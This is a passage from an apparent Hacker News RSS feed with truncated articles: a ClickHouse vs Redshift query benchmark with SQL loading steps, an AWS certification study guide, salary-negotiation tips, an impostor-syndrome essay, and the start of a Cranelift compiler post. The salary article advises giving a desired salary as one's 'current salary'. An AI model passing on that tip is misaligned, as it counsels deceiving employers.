</div><p>Here are the results (all numbers ‚Äî query time in seconds).</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
</tr>
</tbody>
</table>
</figure>
</div><p>Numbers do not look bad for a 1.3B rows dataset, but let‚Äôs look at comparisons.</p><p><h2>Redshift</h2>
</p><p>Now we repeat the same experience with Redshift. Redshift has a limited number of options for instance types to select from, the closest to m5.8xlarge instances we were using for ClickHouse is Redshift dc2.8xlarge instance. dc2.8xlarge is equipped with 32 vCPUs, 244GB of RAM and 2.5TB local SSD. It is important to note that Redshift forces users to use at least two dc2.8xlarge nodes per cluster, which raises the cost of the cluster to $230.40 per day.</p><div><figure><img src="https://lh4.googleusercontent.com/LEjpOZAvu0WdLq0iHeBye24z2_w-cJpeV2aufz_7BskH5yF_c4avbtI82kaGjzNYdkRjrdDbZh0O2tlc-giCk9yH7sRL9AJApEwE2ZGgdXYRyPdJIRszZAIYC2W91kiT3bD-lRsO" alt="Redshift Cluster" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><div><figure><img src="https://lh6.googleusercontent.com/YW5hRb-i-O5dL5ni-05MzdFEVU0-l4S7DOtDurzUVyyFWQYyvXpwcWhyXgPiXvrq9thD23j6bNmBlmZnZg-HQo2ch028pVXt1UyIyX_I2KWHhJ9nd7YOuakiKZKBu1Dvc8JzAgii" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The data loading is easy using standard SQL COPY statement:</p><div><pre><code>COPY tripdata
FROM 's3://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/'
CREDENTIALS ‚Äò‚Äô
DELIMITER ','
  EMPTYASNULL
  ESCAPE
  GZIP
  MAXERROR 100000
  REMOVEQUOTES
  TRIMBLANKS
  IGNOREHEADER
  TRUNCATECOLUMNS;

[2020-07-28 19:43:57] completed in 8 m 26 s 624 ms</code></pre>
</div><p>This is very fast but it takes 80% more time compared to ClickHouse.&nbsp;</p><p>We run the same queries on Redshift using psql with query result cache disabled. Here are the results we‚Äôve got:</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
<td><strong>RedShift dc2.8xlarge x2</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>506</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.59</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.82</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
<td>2.8</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
<td>0.64</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
<td>0.45</td>
</tr>
</tbody>
</table>
</figure>
</div><p>As you can see, the query performance is close between the two databases. ClickHouse is slower on some queries, and faster on others. The total query time is lower with ClickHouse, but it is fair to say there is a tie here.</p><p>Let‚Äôs note, however, that Redshift is running on two nodes and may distribute data and query execution accordingly. For a fair comparison we need to add one more node to ClickHouse as well.</p><p><h2>Scaling ClickHouse Out</h2>
</p><p>Scaling from one to two servers requires some configuration and schema changes. Please refer to our webinar for the details of ClickHouse clustering:&nbsp; <a href="https://www.youtube.com/watch?v=78rrmC-2G6w">‚ÄúStrength in Numbers: Introduction to ClickHouse cluster performance‚Äù</a>. Since we run ClickHouse inside Kubernetes, we can use Altinity <a href="https://github.com/Altinity/clickhouse-operator">clickhouse-operator</a> for Kubernetes that turns adding a node to the cluster to a one click job.</p><p>When a new node is added to the ClickHouse cluster, data is not redistributed automatically. So there are two options:</p><div><ol>
<li>Reload data from S3 to the distributed table.</li>
<li>Reload data from the local to the distributed table with a simple INSERT SELECT statement.</li>
</ol>
</div><p>We tried the first approach in order to measure load time into a distributed table.</p><div><pre><code>CREATE TABLE tripdata_local ON CLUSTER '{cluster}' AS tripdata;

CREATE TABLE tripdata_d ON CLUSTER '{cluster}' AS tripdata Engine = Distributed('{cluster}', default, tripdata_local, rand());

INSERT INTO tripdata_d SELECT * FROM s3(...);</code></pre>
</div><p>Unfortunately, we hit a problem in ClickHouse at this point. The loading into the distributed table was 3-4 times slower due to lack of parallelisation when processing an insert. This is not acceptable by ClickHouse standards, and <a href="https://github.com/ClickHouse/ClickHouse/pull/14120">a fix</a> has been already submitted. So in order to speed things up until the new ClickHouse version is available, we made a trick and re-distributed the table manually using the following technique:</p><div><pre><code>INSERT INTO tripdata_local SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 0

0 rows in set. Elapsed: 84.095 sec. Processed 1.31 billion rows, 167.40 GB (15.59 million rows/s., 1.99 GB/s.)

INSERT INTO FUNCTION remote('second_node_address', default.tripdata_local) SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 1

0 rows in set. Elapsed: 335.122 sec. Processed 1.31 billion rows, 167.40 GB (3.91 million rows/s., 499.52 MB/s.)</code></pre>
</div><p>Here we used yet another table function ‚Äòremote()‚Äô that allows us to query between ClickHouse nodes. Note that we inserted data into a function, which is also a unique ClickHouse extension.</p><p>Below are query results for all tested configurations. We have also added Mark Litwintschick‚Äôs historical data in the last two columns for the reference.&nbsp;</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse </strong><strong><br></strong><strong>m5.8xlarge,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>ClickHouse m5.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>RedShift dc2.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-clickhouse-cluster.html"><strong>ClickHouse</strong><strong><br></strong><strong>c5d.9xlarge x3, Jan 2019</strong></a></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-redshift-large-cluster.html"><strong>Redshift ds2.8xlarge x6, June 2016</strong></a></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>n/a</td>
<td>506</td>
<td>n/a</td>
<td>673</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.35</td>
<td>0.59</td>
<td>0.69</td>
<td>1.25</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.58</td>
<td>0.82</td>
<td>0.58</td>
<td>2.25</td>
</tr>
<tr>
<td>Q3</td>
<td>1.‚Ä¶</td></tr></tbody></table></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</a></em></p>]]>
            </description>
            <link>https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518926</guid>
            <pubDate>Fri, 18 Sep 2020 16:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Solutions Architect Associate Exam ‚Äì everything you need to know]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518880">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://dannys.cloud/aws-solutions-architect-associate-exam-guide | <a href="https://web.archive.org/web/*/https://dannys.cloud/aws-solutions-architect-associate-exam-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The number of courses and content that is available to study for one of the most popular exams: AWS Certified Solutions Architect Associate can be overwhelming. <strong>I've created a complete guide that makes sure you can study effectively and pass in one go!</strong></p>
<h2 id="introduction">Introduction</h2>
<p>My goal is to write a guide on every AWS Certified exam that AWS offers. This is my second article on this series and will contain everything you need to know to successfully prepare you for the AWS Solutions Architect Associate exam [SAA-C02].</p>
<p>This guide will contain a bit more acronyms and is somewhat more targeted towards technical people. If you find that you're relatively new to AWS and the technical side of it. I would recommend having a look at the first guide that I wrote on preparing for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide">AWS Cloud Practitioner exam</a></p>
<p>For the <strong>AWS Solutions Architect Associate</strong> exam - complete guide, I've reviewed all the information that's relevant for this course and curated the content to help you get up to speed more efficiently! By following this guide you should get prepared to successfully pass the exam on the first attempt!</p>
<p><strong>Table Of Contents</strong></p>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#prerequisites">Prerequisites</a></li>
<li><a href="#aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</a><ul>
<li><a href="#domain-1-design-resilient-architectures-30">Domain 1: Design Resilient Architectures - 30%</a></li>
<li><a href="#domain-2-design-high-performing-architectures-28">Domain 2: Design High-Performing Architectures - 28%</a></li>
<li><a href="#domain-3-design-secure-applications-and-architectures-24">Domain 3: Design Secure Applications and Architectures - 24%</a></li>
<li><a href="#domain-4-design-cost-optimized-architectures-18">Domain 4: Design Cost-Optimized Architectures - 18%</a></li>
</ul>
</li>
<li><a href="#how-to-prepare-for-the-exam">How to prepare for the exam?</a></li>
<li><a href="#technical-preparation-notes">Technical Preparation notes</a><ul>
<li><a href="#domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</a><ul>
<li><a href="#ec2-storage-types">EC2 Storage types</a></li>
<li><a href="#amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</a></li>
<li><a href="#design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</a></li>
<li><a href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></li>
</ul>
</li>
<li><a href="#domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</a><ul>
<li><a href="#amazon-rds">Amazon RDS</a></li>
<li><a href="#dynamodb">DynamoDB</a></li>
<li><a href="#elasticache">Elasticache</a></li>
<li><a href="#cloudfront">CloudFront</a></li>
</ul>
</li>
<li><a href="#domain-3-design-secure-applications-and-architectures">Domain 3: Design Secure Applications and Architectures</a><ul>
<li><a href="#shared-responsibility-model">Shared responsibility model</a></li>
<li><a href="#aws-identity-and-access-management-iam">AWS Identity and Access Management (IAM)</a></li>
<li><a href="#aws-key-management-service">AWS Key Management Service</a></li>
<li><a href="#aws-cloudhsm">AWS CloudHSM</a></li>
<li><a href="#aws-vpc">AWS VPC</a></li>
</ul>
</li>
<li><a href="#domain-4-design-cost-optimized-architectures">Domain 4: Design Cost-Optimized Architectures</a></li>
</ul>
</li>
<li><a href="#practice-exam-questions">Practice exam questions</a><ul>
<li><a href="#practice-question-1">Practice question #1</a></li>
<li><a href="#practice-question-2">Practice question #2</a></li>
<li><a href="#practice-question-3">Practice question #3</a></li>
<li><a href="#practice-question-4">Practice question #4</a></li>
<li><a href="#practice-question-5">Practice question #5</a></li>
<li><a href="#practice-question-6">Practice question #6</a></li>
<li><a href="#practice-question-7">Practice question #7</a></li>
</ul>
</li>
<li><a href="#aws-certified-solutions-architect-associate-study-material">AWS Certified Solutions Architect Associate Study material</a><ul>
<li><a href="#reading-material">Reading material</a></li>
<li><a href="#video-material">Video material</a></li>
</ul>
</li>
<li><a href="#you-should-now-be-fully-prepared-for-the-aws-certified-solutions-architect-associate-exam">You should now be fully prepared for the AWS Certified Solutions Architect Associate exam!</a></li>
<li><a href="#aws-certified-solutions-architect-associate-exam--faq">AWS Certified Solutions Architect Associate exam ‚Äì FAQ</a><ul>
<li><a href="#is-the-aws-certified-solutions-architect-associate-exam-easy">Is the AWS Certified Solutions Architect Associate exam easy?</a></li>
<li><a href="#how-long-does-it-take-to-prepare-for-the-aws-certified-solutions-architect-associate-certification">How long does it take to prepare for the AWS Certified Solutions Architect Associate certification?</a></li>
<li><a href="#im-ready-to-do-the-aws-certified-solutions-architect-associate-exam-how-do-i-schedule-it">I‚Äôm ready to do the AWS Certified Solutions Architect Associate exam, how do I schedule it?</a></li>
</ul>
</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>This exam is intended for people who have one or more years of hands-on experience designing available,
  cost-efficient, fault-tolerant, and scalable distributed systems on AWS. You're required to be familiar with the AWS
  terminology and with the most common used AWS Services</p>
<p>If you want to start practicing with these AWS Services, it is important to create a <a target="_blank" href="https://portal.aws.amazon.com/billing/signup#/start">free AWS account</a> first. AWS offers a <a target="_blank" href="http://aws.amazon.com/free">free tier</a> to get familiar with its services without expenses so you can
  experiment with the exercises that are provided in this guide.</p>
<p>AWS recommends you to have the following experience and knowledge before attending the exam:</p>
<blockquote>
<ul>
<li>Hands-on experience using compute, networking, storage, and database AWS services</li>
<li>Hands-on experience with AWS deployment and management services</li>
<li>Ability to identify and define technical requirements for an AWS-based application</li>
<li>Ability to identify which AWS services meet a given technical requirement</li>
<li>Knowledge of recommended best practices for building secure and reliable applications on the AWS platform</li>
<li>An understanding of the basic architectural principles of building on the AWS Cloud</li>
<li>An understanding of security features and tools that AWS provides and how they relate to traditional services</li>
</ul>
<p><a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">AWS Certified Solutions Architect Associate certification page</a></p>
</blockquote>
<h2 id="aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</h2>
<p>Some <a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">practical information</a> that is interesting to know when you plan to schedule the exam:</p>
<ul>
<li>The AWS Solutions Architect Associate exam consists of 65 multiple-choice, multiple-answer questions.</li>
<li>You have 130 minutes to complete the exam.</li>
<li>The exam costs $150,-</li>
<li>The official practice exam costs $20</li>
<li>The minimum passing score for this exam is 720 points</li>
<li>The exam is available in English, Japanese, Korean, and Simplified Chinese.</li>
</ul>
<p>As explained in the official <a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">AWS Certified Solutions Architect exam guide</a>. It covers the following topics including their weighted percentage:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867470378/5orOtiSu2.jpeg?auto=format&amp;q=60" alt="AWS Solutions Architect content outline domains"></p><p>
AWS Solutions Architect content outline domains

</p><h3 id="domain-1-design-resilient-architectures-30">Domain 1: <strong>Design Resilient Architectures - 30%</strong></h3>
<blockquote>
<p>1.1 Design a multi-tier architecture solution
1.2 Design highly available and/or fault-tolerant architectures
1.3 Design decoupling mechanisms using AWS services
1.4 Choose appropriate resilient storage</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The first domain requires you to understand how to build effective architectures using fundamental AWS services like EC2, VPC, RDS, S3, etc. Best practices are important to know when building these architectures, so it's good to understand the <a target="_blank" href="https://aws.amazon.com/architecture/well-architected/">AWS Well-Architected Framework</a>.</p>
<h3 id="domain-2-design-high-performing-architectures-28">Domain 2: <strong>Design High-Performing Architectures - 28%</strong></h3>
<blockquote>
<p>2.1 Identify elastic and scalable compute solutions for a workload
2.2 Select high-performing and scalable storage solutions for a workload
2.3 Select high-performing networking solutions for a workload
2.4 Choose high-performing database solutions for a workload</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The focus in this domain lies in building resilient architectures that make use of Scalability and Elasticity. You need to be able to understand the purpose of implementing Multi-AZ and Auto-Scaling to drive costs down and improve fault tolerance.</p>
<h3 id="domain-3-design-secure-applications-and-architectures-24">Domain 3: <strong>Design Secure Applications and Architectures - 24%</strong></h3>
<blockquote>
<p>3.1 Design secure access to AWS resources
3.2 Design secure application tiers
3.3 Select appropriate data security options</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>For the third domain, you're required to understand how to add security measures on four different levels: AWS
  resources, network-, application- and data-layer. The data layer can be distinguished in two parts, data in transit and data at rest. For data-security encryption plays a primary role and for networking it's important to know access controls like Security groups, ACLs, etc.</p>
<h3 id="domain-4-design-cost-optimized-architectures-18">Domain 4: <strong>Design Cost-Optimized Architectures - 18%</strong></h3>
<blockquote>
<p>4.1 Identify cost-effective storage solutions
4.2 Identify cost-effective compute and database services
4.3 Design cost-optimized network architectures</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>In the last domain, you need to know how to build cost-efficient architectures with scalability and resiliency taken into consideration. You'll also need to know how to select the right type of any resource to effectively do the task at hand. And at last, it's important to know how to optimize your network design to transfer data the most efficiently from on-premise to the Cloud.</p>
<h2 id="how-to-prepare-for-the-exam">How to prepare for the exam?</h2>
<p>In this section, I've bundled up some notes which can be of use when preparing for the AWS Solutions Architect Associates exam. Prior to this Blogpost, I've also released a guide for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide/#technical-preparation-notes">AWS Cloud Practitioner exam technical preparation notes</a>. This contains the foundational information which also helps for this exam, so I highly recommend to read the notes from there as well.</p>
<p>Moving on to the preparation, I‚Äôve written some technical notes which highlight import details which are worth remembering. Next to that, I‚Äôll be sharing seven practice questions that give a good indication of what to expect on the real exam. At last, I‚Äôll be sharing my AWS Solutions Architect learning material list which contains a curated collection of high-quality content to help you study efficiently.</p>
<p>The learning material is divided into two parts:</p>
<ul>
<li>Reading material</li>
<li>Visual material</li>
</ul>
<p>For the readers, I'll be sharing my recommended books to read. For the visual learners, I'll provide the videos that will help you prepare for the exam.</p>
<h2 id="technical-preparation-notes">Technical Preparation notes</h2>
<p>The technical notes are a bundled package of dense information that helps you get insight into what technical services and details are being treated at the exams. I've divided it into the domains that you'll see at the exam.</p>
<h3 id="domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</h3>
<h4 id="ec2-storage-types">EC2 Storage types</h4>
<ul>
<li>Amazon Elastic Block Store (Amazon EBS) provides block-level storage volumes for use with Amazon EC2 instances. Three flavors: Magnetic, General purpose SSD, provisioned IOPS SSD. Snapshots can be created and are saved in S3.</li>
<li>Ephemeral storage (legacy) is temporary storage for your EC2 instance. Good to use as a scratch disk, not storing data! Data will be removed after the instance shuts down.</li>
</ul>
<p><strong>Elastic File System (EFS)</strong>
It's a highly durable storage that can be shared with EC2 instance (NFS protocol). A good use case for former stateful applications that need block storage but aren't scalable yet. This provides a good solution to make your application scalable whilst keeping the data intact.</p>
<h4 id="amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</h4>
<p>S3 is object storage which is highly durable 99.999999999% with virtually unlimited capacity. It contains different <a target="_blank" href="https://aws.amazon.com/s3/storage-classes/">storage classes:</a></p>
<ul>
<li>S3 standard</li>
<li>S3 Intelligent-Tiering</li>
<li>S3 Standard-Infrequent Access</li>
<li>S3 One Zone-Infrequent Access</li>
<li>S3 Glacier</li>
<li>S3 Glacier Deep Archive</li>
</ul>
<h4 id="design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</h4>
<p>Decoupling components becomes important when you're architecting in the cloud. Loose coupling isolates the layers and components of your application so that each component interacts asynchronously with the others. This is necessary if you want to enable scalability and want your system to become stateless.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867420658/5ipcnFqVD.jpeg?auto=format&amp;q=60" alt="Order dispatcher example decoupled system"></p><p>
Example of a decoupled system using SQS + Autoscaling

</p><h4 id="elastic-load-balancer-elb">Elastic Load Balancer (ELB)</h4>
<p>ELB's are a trivial part of high availability and scalability. It comes in 3 flavors:</p>
<ul>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/introduction.html">Classic ELB</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html">Application Load Balancer (ALB)</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancer (NLB)</a></li>
</ul>
<p><strong>Sources</strong>
<a target="_blank" href="https://aws.amazon.com/ebs/faqs/">Amazon EBS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/efs/faq/">EFS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/s3/faqs/">S3 FAQs</a>
<a target="_blank" href="https://d0.awsstatic.com/whitepapers/Storage/AWS%20Storage%20Services%20Whitepaper-v9.pdf">AWS Storage Services whitepaper</a></p>
<h3 id="domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</h3>
<h4 id="amazon-rds">Amazon RDS</h4>
<p>For relational databases, Amazon ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dannys.cloud/aws-solutions-architect-associate-exam-guide">https://dannys.cloud/aws-solutions-architect-associate-exam-guide</a></em></p>]]>
            </description>
            <link>https://dannys.cloud/aws-solutions-architect-associate-exam-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518880</guid>
            <pubDate>Fri, 18 Sep 2020 16:37:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Your Salary as a Developer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518792">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/how-to-negotiate-your-salary-as-a-developer | <a href="https://web.archive.org/web/*/https://catalins.tech/how-to-negotiate-your-salary-as-a-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your ‚Äúcurrent salary.‚Äù
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‚Äòno‚Äô. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: ‚ÄúI have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.‚Äù Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/how-to-negotiate-your-salary-as-a-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518792</guid>
            <pubDate>Fri, 18 Sep 2020 16:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Impostor Syndrome ‚Äì A Developer's Best Friend]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518783">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/impostor-syndrome-a-developers-best-friend | <a href="https://web.archive.org/web/*/https://catalins.tech/impostor-syndrome-a-developers-best-friend">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597582091064/7sW4dzIjK.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Reading the title, you might say something is wrong with me. But I dare to repeat it. The impostor syndrome is a developer's best friend when appropriately managed. I also believe that the impostor syndrome is more prominent in software development due to the large volume of knowledge you need to possess, and the constant changing of tools and programming languages. The programming language and tools you are using today might become obsolete in one year. That means "starting from the zero" (an exaggeration to emphasise the point) again. It is a very dynamic environment where you have to learn continuously. The ones that survive are the ones that can adapt. </p>
<p>Thus, it is almost impossible to get rid of the impostor syndrome. Why not learn to live with it?</p>

<p>Let me tell you another thing. Almost all of us suffer from impostor syndrome. There is always someone better than us. There is always something that we do not know. There is always something to learn. A new tool gets released every day. A new technology or programming language emerges every once in a while. You can never learn and know all of them. Trying to keep up is very difficult as well. And that is how the syndrome creeps in. You start asking yourself questions such as "Will I ever make it?", "Will I ever be able to do x, y, z?", "Will I know technology x, y, z?", "What if I am an impostor?", and the list goes on. The answer is yes, yes, and yes,</p>
<p>By the way, the syndrome is even worse for beginners, who feel they are never going to make it in this field. Been there, done that. You will make it with persistent, hard work.</p>

<p>You are not the only one asking himself/herself those questions. The developer next to you at work has the same questions. The developer you follow on Twitter has the same questions. That YouTuber with 50000 subscribers has the same questions. I have the same questions, even though I have a job and I am doing very well.</p>
<p>You are not the only one with these questions, and you will never be. The impostor syndrome is part of us, and as I said, it is more prominent in our industry. Of course, some people deal with it better, so it is not that obvious they have it as well. But almost all of us have it, trust me.</p>

<p>First of all, you should know that it can be your best friend because it pushes you to become better. The feeling that you are not made for this industry, or that you do not know enough, could push you to learn more. As a result, you better yourself every day. I use the impostor syndrome as fuel, as motivation to become a better developer, and it works very well. Beware though; it can quickly push you to burn out. Trust me, you do not want that.</p>
<p>Secondly, whenever those questions and irrational thoughts creep into your mind, REMEMBER that all developers suffer from this syndrome. REMEMBER that there is always a developer better than you. But also REMEMBER that there is always a developer that is beneath you. REMEMBER that you can never know everything, and that is fine. You only need to know a handful of tools, which are relevant to your job. With perseverance and hard work, you can become a developer.</p>
<p>Will you become the best programmer? Probably no. Will you work at Amazon/Facebook/Google/Apple? Probably no. Will you make millions? Probably no. Will you develop the best next thing? Probably no. But guess what? That is fine. You do not have to do any of those to be a decent developer. Actually, most of us never achieve those goals.</p>

<ul>
<li>Almost all of us has the impostor syndrome.</li>
<li>You can make it in this industry with hard work.</li>
<li>You will never know everything, and that is fine.</li>
<li>There are always developers better than, but there are also developers worse than you.</li>
<li>You do not have to be a "superstar" developer. Being a decent developer is enough.</li>
</ul>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/impostor-syndrome-a-developers-best-friend</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518783</guid>
            <pubDate>Fri, 18 Sep 2020 16:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Backend for Cranelift, Part 1: Instruction Selection]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518724">thread link</a>) | @cfallin
<br/>
September 18, 2020 | https://cfallin.org/blog/2020/09/18/cranelift-isel-1/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the first in a three-part series about my recent work on
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>
as part of my day job at Mozilla. In this first post, I will set some context
and describe the instruction selection problem. In particular, I‚Äôll talk about
